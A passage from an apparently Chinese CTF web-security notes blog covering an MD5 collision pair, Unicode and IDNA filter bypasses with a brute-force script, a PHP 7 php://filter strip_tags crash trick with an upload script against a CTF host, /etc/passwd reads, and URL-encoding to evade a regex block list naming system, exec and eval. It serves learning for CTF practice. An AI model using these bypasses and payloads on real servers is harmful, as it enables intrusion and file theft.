class="number">0</span>F%C8t%F28zV%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9%E24%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D%B7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">1</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CF%CEB%E7%EF%B0</span><br></pre></td></tr></table></figure>

<p>可以看到，1.txt和2.txt文件二进制md5加密后的结果完全相同。由于1.txt和2.txt文件中含有不可见字符，所以需要将其url编码后使用。可以看到url编码后的两个字符串不完全相同，满足我们输入两个不同参数的需要。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212022967.png"><img src="/Notes/image-20240113212022967.png" alt="image-20240113212022967"></a></p>
<p>当题目限制不能传入数组，只能传入字符串时，如下例题，就只能采用解法2.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Unionde等价性的漏洞"><a href="#Unionde等价性的漏洞" class="headerlink" title="Unionde等价性的漏洞"></a>Unionde等价性的漏洞</h1><p>这里由于只能输入一个字符，所以这里利用了utf-8编码。</p>
<p>两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。</p>
<p>这里在compart网站上找一个大于1337的值</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a></p>
<p>在搜索框中搜索thousand</p>
<p><a data-fancybox="gallery" data-src="/Notes/%7B9B902913-B5EA-4AF3-ADD1-A61F97A0281C%7D.png"><img src="/Notes/%7B9B902913-B5EA-4AF3-ADD1-A61F97A0281C%7D.png" alt="{9B902913-B5EA-4AF3-ADD1-A61F97A0281C}"></a></p>
<p>这里我选择了罗马数字十万</p>
<p>数值是100000</p>
<p>utf-8的值是<code>0xE2 0x86 0x88</code></p>
<p>换成%    &#x3D;&gt;  %E2%86%88</p>
<h1 id="idna与utf-8编码漏洞"><a href="#idna与utf-8编码漏洞" class="headerlink" title="idna与utf-8编码漏洞"></a>idna与utf-8编码漏洞</h1><p>来自Black hat 2019<br><strong>原理</strong><br><strong>什么是IDN?</strong><br>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p>
<p><strong>什么是idna?</strong><br>A library to support the Internationalised Domain Names in Applications (IDNA) protocol as specified in RFC 5891. This version of the protocol is often referred to as “IDNA2008” and can produce different results from the earlier standard from 2003.<br>&gt;&gt;&gt; import idna<br>&gt;&gt;&gt; print(idna.encode(u’ドメイン.テスト’))<br>结果:xn–eckwd4c7c.xn–zckzah<br>&gt;&gt;&gt; print idna.decode(‘xn–eckwd4c7c.xn–zckzah’)<br>结果:ドメイン.テスト</p>
<p><strong>Demo</strong>:<br><code>℆</code>这个字符,如果使用python3进行idna编码的话<br><code>print(&#39;℆&#39;.encode(&#39;idna&#39;))</code><br>结果<br><code>b&#39;c/u&#39;</code><br>如果再使用utf-8进行解码的话<br><code>print(b&#39;c/u&#39;.decode(&#39;utf-8&#39;))</code><br>结果<br><code>c/u</code></p>
<p>可以用于绕过一些过滤，如</p>
<p>过滤了suctf.cc，但是中间进行了多次decode(‘utf-8’)，就可以如下进行绕过用<code>℆</code>转化成<code>c/u</code></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf.<span class="keyword">c</span>℆ -&gt; suctf.<span class="keyword">cc</span>/u</span><br></pre></td></tr></table></figure>

<p>可以用脚本跑出其他字符，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unicode</span>():</span><br><span class="line">    length = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter the number of characters to read from the host: &#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni = <span class="built_in">chr</span>(x)</span><br><span class="line">        url = <span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST[:-length], uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span> + uni + <span class="string">&#x27; unicode: \\u&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:  <span class="comment"># 取出实际主机名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == HOST.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST = <span class="built_in">input</span>(<span class="string">&#x27;Enter URL: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> HOST:</span><br><span class="line">        HOST = <span class="string">&#x27;http://&#x27;</span> + HOST</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20250124105534724.png"><img src="/Notes/image-20250124105534724.png" alt="image-20250124105534724"></a></p>
<h1 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h1><h3 id="php7-0的bug"><a href="#php7-0的bug" class="headerlink" title="php7.0的bug"></a>php7.0的bug</h3><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</p>
<blockquote>
<p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p>
<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
</blockquote>
<h4 id="利用segment-fault特性"><a href="#利用segment-fault特性" class="headerlink" title="利用segment fault特性"></a>利用segment fault特性</h4><p>php版本是7.0.33，这里预期解是1号情况。</p>
<ul>
<li><p>php&lt;7.2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p>php7老版本通杀</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;http://f0af8aa4-9e9c-40a8-9003-175dbc6f69f8.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h1 id="PHP读取请求解析漏洞"><a href="#PHP读取请求解析漏洞" class="headerlink" title="PHP读取请求解析漏洞"></a>PHP读取请求解析漏洞</h1><blockquote>
<p><code>$_REQUEST</code>的传参中<code>POST</code>的优先级比<code>GET</code>高，所以如下可以对post传入数字，这样就绕过了对get中字母的检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>会读取<code>?</code>后面的内容，</p>
<p>在读取url时并不会对<code>url</code>进行解码，</p>
<p>而<code>$_GET[&#39;x&#39;]</code>是会进行url解码的，</p>
<p>所以我们要把可能出现在黑名单的字符串进行url编码后再传入，所以需要将后续GET包括参数名都进行编码</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="meta">%</span><span class="number">66</span><span class="meta">%</span><span class="number">69</span><span class="meta">%</span><span class="number">6</span>C<span class="meta">%</span><span class="number">65</span>=<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">3</span>A<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">74</span><span class="meta">%</span><span class="number">2</span>F<span class="meta">%</span><span class="number">70</span><span class="meta">%</span><span class="number">6</span>C<span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">69</span><span class="meta">%</span><span class="number">6</span>E<span class="meta">%</span><span class="number">2</span>C<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">62</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">5</span>F<span class="meta">%</span><span class="number">64</span><span class="meta">%</span><span class="number">65</span><span class="meta">%</span><span class="number">62</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">5</span>F<span class="meta">%</span><span class="number">61</span><span class="meta">%</span><span class="number">71</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">61</span></span><br><span class="line"><span class="comment">//?file=data://text/plain,debu_debu_aqua</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="Rabbit加密"><a href="#Rabbit加密" class="headerlink" title="Rabbit加密"></a>Rabbit加密</h1><blockquote>
<p>Rabbit使用一个128位密钥和一个64位初始化向量。该加密算法的核心组件是一个位流生成器，该生成器每次迭代都会加密128个消息位。加密后的数据以U2FsdGVkX1开头，可以设定密钥。</p>
</blockquote>
<blockquote>
<p>特点：Rabbit加密开头部分通常为U2FsdGVkX1</p>
</blockquote>
<blockquote>
<p>这个固定的头是cryptojs的格式（很多在线加解密网站都用的这个库）。如果头不是这个固定头的Rabbit算法推荐用cyberchef解</p>
</blockquote>

    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\Noteless\" rel="bookmark">web基础随记</a></div>
    </li>
  </ul>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/daily/" rel="tag"># daily</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/tools-making/" rel="prev" title="工具项目编写">
      <i class="fa fa-chevron-left"></i> 工具项目编写
    </a></div>
      <div class="post-nav-item">
    <a href="/2022hxp/" rel="next" title="hxp2022 wp">
      hxp2022 wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pearcmd-php%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">pearcmd.php的巧妙利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#libmbfl%E6%89%93%E5%88%86"><span class="nav-number">2.</span> <span class="nav-text">libmbfl打分</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat%E4%BB%A5-%E4%B8%80%E7%A7%8D%E5%A5%87%E6%80%AA%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%A7%84%E8%8C%83%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">Tomcat以;一种奇怪的方式进行规范化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFXSS%E3%80%90%E9%92%88%E5%AF%B9%E4%BA%8E%E5%8A%A8%E6%80%81PDF%E3%80%91"><span class="nav-number">4.</span> <span class="nav-text">服务器端XSS【针对于动态PDF】</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell"><span class="nav-number">5.</span> <span class="nav-text">获得稳定的shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#T3%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">T3协议的反序列化攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%85%AC%E7%BD%91%E6%B5%8B%E8%AF%95"><span class="nav-number">7.</span> <span class="nav-text">记第一次公网测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#file-b%E8%A7%A3%E6%9E%90-%E5%90%8E%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA"><span class="nav-number">8.</span> <span class="nav-text">file -b解析#!后内容显示</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#strace%E5%91%BD%E4%BB%A4"><span class="nav-number">9.</span> <span class="nav-text">strace命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">10.</span> <span class="nav-text">Mysql主从复制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E3%80%90%E4%B8%BB%E3%80%91"><span class="nav-number">10.1.</span> <span class="nav-text">攻击机【主】</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%89%A7%E8%A1%8C%E3%80%90%E4%BB%8E%E3%80%91"><span class="nav-number">10.1.1.</span> <span class="nav-text">环境执行【从】</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows%E4%B8%8Elinux%E5%AF%B9-%E7%9A%84%E4%B8%8D%E5%90%8C%E8%A7%A3%E6%9E%90%E4%B8%8E%E9%99%90%E5%88%B6"><span class="nav-number">11.</span> <span class="nav-text">windows与linux对;的不同解析与限制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flask%E7%9A%84Debug%E6%A8%A1%E5%BC%8F"><span class="nav-number">12.</span> <span class="nav-text">Flask的Debug模式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8debug%E5%8A%9F%E8%83%BD%E8%83%BD%E5%B9%B2%E5%95%A5"><span class="nav-number">12.1.</span> <span class="nav-text">利用debug功能能干啥</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PIN-%E7%A0%81%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90"><span class="nav-number">12.2.</span> <span class="nav-text">PIN 码如何生成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95"><span class="nav-number">12.2.1.</span> <span class="nav-text">生成算法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="nav-number">13.</span> <span class="nav-text">反序列化逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">14.</span> <span class="nav-text">session进行文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#session-upload-progress%E4%BD%9C%E7%94%A8%EF%BC%9F"><span class="nav-number">14.1.</span> <span class="nav-text">session.upload_progress作用？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="nav-number">15.</span> <span class="nav-text">hash长度扩展攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MD5%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="nav-number">15.1.</span> <span class="nav-text">MD5加密原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php"><span class="nav-number">16.</span> <span class="nav-text">php&lt;&#x3D;7.4.21 内置服务器任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-4-21"><span class="nav-number">16.1.</span> <span class="nav-text">7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC%E6%9C%89index-php%E6%83%85%E5%86%B5"><span class="nav-number">16.1.1.</span> <span class="nav-text">低版本有index.php情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">16.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php-8%E9%9D%9E%E6%B3%95%E5%8F%82%E6%95%B0%E5%90%8D%E4%BC%A0%E5%8F%82"><span class="nav-number">17.</span> <span class="nav-text">php &lt; 8非法参数名传参</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E"><span class="nav-number">18.</span> <span class="nav-text">PHP写入配置文件的经典漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%88%A9%E7%94%A8%E6%8D%A2%E8%A1%8C%E7%AC%A6%E6%9D%A5%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">18.1.</span> <span class="nav-text">方法一,利用换行符来绕过正则匹配的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8-preg-replace%E5%87%BD%E6%95%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">18.2.</span> <span class="nav-text">方法二,利用 preg_replace函数的问题:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E5%88%A9%E7%94%A8-preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">18.3.</span> <span class="nav-text">方法三, 利用 preg_replace() 函数的第二个参数的问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MD5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-number">19.</span> <span class="nav-text">MD5强类型比较</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AF%94%E8%BE%83"><span class="nav-number">19.1.</span> <span class="nav-text">&#x3D;&#x3D;&#x3D;比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="nav-number">19.2.</span> <span class="nav-text">解法1：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="nav-number">19.3.</span> <span class="nav-text">解法2：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0"><span class="nav-number">19.3.1.</span> <span class="nav-text">构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">19.3.2.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unionde%E7%AD%89%E4%BB%B7%E6%80%A7%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">20.</span> <span class="nav-text">Unionde等价性的漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">21.</span> <span class="nav-text">idna与utf-8编码漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#string-strip-tags"><span class="nav-number">22.</span> <span class="nav-text">string.strip_tags</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php7-0%E7%9A%84bug"><span class="nav-number">22.0.1.</span> <span class="nav-text">php7.0的bug</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8segment-fault%E7%89%B9%E6%80%A7"><span class="nav-number">22.0.1.1.</span> <span class="nav-text">利用segment fault特性</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E8%AF%BB%E5%8F%96%E8%AF%B7%E6%B1%82%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">23.</span> <span class="nav-text">PHP读取请求解析漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rabbit%E5%8A%A0%E5%AF%86"><span class="nav-number">24.</span> <span class="nav-text">Rabbit加密</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
